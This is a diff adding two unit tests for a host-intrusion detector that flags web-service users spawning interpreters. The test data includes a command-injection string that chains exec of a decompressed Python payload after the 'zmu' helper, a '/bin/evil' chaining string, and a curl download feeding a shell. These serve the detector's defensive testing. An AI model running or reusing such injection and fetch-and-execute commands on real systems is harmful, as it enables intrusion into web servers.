@@ -109,6 +109,35 @@ def test_web_user_unmodelled_shell_syntax_is_unevaluable_not_an_indicator():
     assert all("could not be parsed" not in note for note in final[0].notes)
 
 
+def test_web_user_partial_script_prefix_can_supply_positive_chaining_indicator():
+    pb = host.WebServiceSpawnsInterpreter()
+    argv = [
+        "sh", "-c",
+        r"/usr/bin/zmu -A -a -m ;echo exec\(__import__\(\'zlib\'\).decompress\(payload\)\) "
+        r"| exec $(which python || which python3) -",
+    ]
+
+    immediate = pb.consume([exec_ev(argv, user="www-data")])
+
+    assert len(immediate) == 1 and immediate[0].proposed_lane == "high"
+    assert pb.missing_required == 1
+    assert "indicator: additional commands chained after application helper 'zmu'" in immediate[0].notes
+    assert any("clean prefix only" in note for note in immediate[0].notes)
+
+
+def test_web_user_partial_prefix_does_not_read_chaining_text_after_unclosed_construct():
+    pb = host.WebServiceSpawnsInterpreter()
+    argv = ["sh", "-c", '/usr/bin/zmu -A -a -m "$(echo x; /bin/evil']
+
+    immediate = pb.consume([exec_ev(argv, user="www-data")])
+    final = pb.finalize()
+
+    assert immediate == []
+    assert pb.missing_required == 1
+    assert len(final) == 1 and final[0].proposed_lane == "lead"
+    assert final[0].notes == ["rare shape without typed indicators"]
+
+
 # ---------------------------------------------------------------- downloader feeds interpreter (sequence)
 def test_downloader_and_stdin_shell_with_same_parent():
     d = exec_ev(["curl", "http://192.0.2.7/README.txt.1"], process__ppid=500)
